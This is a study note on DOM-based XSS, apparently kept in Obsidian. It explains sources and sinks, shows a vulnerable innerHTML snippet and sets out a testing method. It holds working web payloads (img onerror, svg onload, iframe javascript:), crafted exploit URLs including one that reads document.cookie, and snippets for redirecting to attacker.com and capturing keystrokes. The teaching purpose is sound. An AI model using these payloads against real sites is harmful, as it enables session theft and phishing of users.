# XSS – DOM-Based XSS

## Overview

DOM-based XSS is a **Non-Persistent XSS vulnerability** that occurs entirely in the browser.

Unlike reflected XSS:

```
input never reaches the server
```

Instead, JavaScript running in the browser processes user-controlled input and dynamically updates the page.

If this input is not sanitized, malicious JavaScript executes.

---

# Key Characteristics

- processed entirely client-side
- no server interaction required
- payload often stored in URL fragment (#)
- not visible in raw page source
- executed dynamically in browser
- non-persistent
- requires victim interaction

---

# How DOM XSS Works

Modern web applications frequently use JavaScript to dynamically update page content.

This interaction occurs through the:

```
Document Object Model (DOM)
```

The DOM allows JavaScript to modify HTML content after page load.

---

# Example URL Parameter

```
http://target/app/#task=test
```

The portion after:

```
#
```

is called a fragment identifier.

Fragment values:

- never sent to the server
- processed only by browser JavaScript

---

# Identifying DOM XSS

Indicators:

- no HTTP requests triggered when input submitted
- payload visible in browser URL after #
- input not visible in page source (CTRL+U)
- page updated dynamically
- JavaScript modifies DOM

---

# Example Vulnerable JavaScript

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

document.getElementById("todo").innerHTML =
"<b>Next Task:</b> " + decodeURIComponent(task);
```

---

# Source and Sink Concept

Understanding DOM XSS requires identifying:

```
Source → where input enters
Sink → where input is written to DOM
```

---

# Source

Location where attacker controls data.

Examples:

```javascript
document.URL
location.href
location.search
location.hash
document.referrer
window.name
```

Example:

```javascript
var task = document.URL.substring(...)
```

Attacker controls value.

---

# Sink

Function that writes data into DOM.

Dangerous sinks include:

```javascript
innerHTML
outerHTML
document.write()
document.writeln()
insertAdjacentHTML()
```

jQuery sinks:

```javascript
append()
after()
html()
add()
```

---

# Vulnerability Condition

DOM XSS exists when:

```
user input flows from Source → Sink
without sanitization
```

---

# Why \<script> Payload May Fail

Some DOM sinks block `<script>` execution

Example:

```javascript
innerHTML
```

May prevent script tags from executing.

However:

```
JavaScript events can still execute
```

---

# Working DOM XSS Payload

```html
<img src="" onerror=alert(window.origin)>
```

---

# Why This Works

HTML image element:

```html
<img src="">
```

Browser attempts to load image.

Fails → triggers:

```
onerror event
```

Event executes JavaScript:

```javascript
alert(window.origin)
```

---

# Example Exploit URL

```
http://target/#task=<img src="" onerror=alert(1)>
```

---

# Execution Flow

1. victim opens crafted URL
2. browser loads page
3. JavaScript extracts parameter from URL
4. JavaScript writes content to DOM
5. malicious code executes

---

# Viewing DOM Changes

DOM updates are not visible in raw source.

View rendered DOM:

```
CTRL + SHIFT + C
```

or

Inspect Element → Elements tab

---

# Common DOM XSS Sources

### URL fragments

```
location.hash
```

---

### query parameters

```
location.search
```

---

### referrer

```
document.referrer
```

---

### window object

```
window.name
```

---

# Common DOM XSS Sinks

### innerHTML

```javascript
element.innerHTML
```

---

### document.write

```javascript
document.write(userInput)
```

---

### jQuery html()

```javascript
$("#output").html(userInput)
```

---

# DOM XSS Payload Examples

## basic event handler

```html
<img src=x onerror=alert(1)>
```

---

## SVG payload

```html
<svg onload=alert(1)>
```

---

## iframe payload

```html
<iframe src=javascript:alert(1)>
```

---

## body event

```html
<body onload=alert(1)>
```

---

## input autofocus trigger

```html
<input autofocus onfocus=alert(1)>
```

---

# DOM vs Reflected XSS

| Feature | DOM XSS | Reflected XSS |
|--------|---------|--------------|
| server interaction | no | yes |
| stored in DB | no | no |
| processed by JS | yes | no |
| visible in page source | no | yes |
| uses fragment (#) | often | rarely |

---

# Attack Delivery

Attacker sends crafted URL:

```
http://target/#task=<img src=x onerror=alert(document.cookie)>
```

Victim opens link.

Payload executes.

---

# Impact Examples

### cookie theft

```javascript
document.cookie
```

---

### redirect victim

```javascript
window.location="http://attacker.com"
```

---

### capture keystrokes

```javascript
document.onkeypress
```

---

### phishing content injection

```javascript
document.body.innerHTML
```

---

# Testing Methodology

### Step 1 – identify client-side processing

observe no HTTP requests.

---

### Step 2 – identify Source

look for:

```javascript
location.hash
document.URL
```

---

### Step 3 – identify Sink

look for:

```javascript
innerHTML
document.write
```

---

### Step 4 – inject payload

```html
<img src=x onerror=alert(1)>
```

---

# Key Takeaways

- DOM XSS occurs entirely in browser
- input processed by JavaScript
- often uses URL fragment (#)
- not visible in raw source code
- relies on vulnerable DOM sinks
- requires different payloads than reflected XSS

---

# Quick Reference

## common source

```javascript
location.hash
```

---

## common sink

```javascript
innerHTML
```

---

## test payload

```html
<img src=x onerror=alert(1)>
```

---

# Tags

#xss  
#dom-xss  
#client-side  
#javascript  
#web-security  
#owasp  
#pentesting  
#source-and-sink  
#obsidian